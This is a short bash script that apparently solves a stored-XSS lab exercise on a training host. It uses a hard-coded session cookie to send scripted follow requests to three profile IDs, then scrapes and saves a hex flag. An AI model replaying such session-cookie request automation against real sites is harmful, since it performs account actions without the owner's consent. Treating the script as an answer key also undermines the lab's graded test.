#!/bin/bash

# Your specific session cookie
COOKIE="session=3RJ5sp5dX26P3MvO6g-1Ij1o8Nw1uynqn-g0K5YAg2A.AZEeRu6s4gQQZsIskAP0Wq2FkO8"
BASE_URL="http://web0x01.hbtn/a3/xss_stored"

# The 3 Target IDs
IDS=("811152675" "918203" "32781850")

echo "[*] Targeted Following starting..."

for ID in "${IDS[@]}"; do
    echo "[+] Visiting Profile and Following ID: $ID"
    
    # Step 1: Visit the profile page
    curl -s -b "$COOKIE" "$BASE_URL/profile/$ID" > /dev/null
    
    # Step 2: Trigger the follow action 
    # (Testing both common path structures used in this lab)
    curl -s -b "$COOKIE" "$BASE_URL/follow/$ID" > /dev/null
    curl -s -b "$COOKIE" -X POST "http://web0x01.hbtn/api/a3/xss_stored/follow/$ID" > /dev/null
done

echo "------------------------------------------------"
echo "[*] All requests sent. Checking for flag..."
echo "------------------------------------------------"

# Fetch your own profile where the flag should appear
RESULT=$(curl -s -b "$COOKIE" "$BASE_URL/profile")

# Attempt to extract a 32-character hex flag
FLAG=$(echo "$RESULT" | grep -oE "[a-f0-9]{32}")

if [ -z "$FLAG" ]; then
    echo "[-] Flag not found in raw text. Check the page manually:"
    echo "    http://web0x01.hbtn/a3/xss_stored/profile"
else
    echo "[!] FLAG FOUND: $FLAG"
    # Save it to the required file
    echo -n "$FLAG" > 2-flag.txt
    echo "[!] Flag saved to 2-flag.txt"
fi
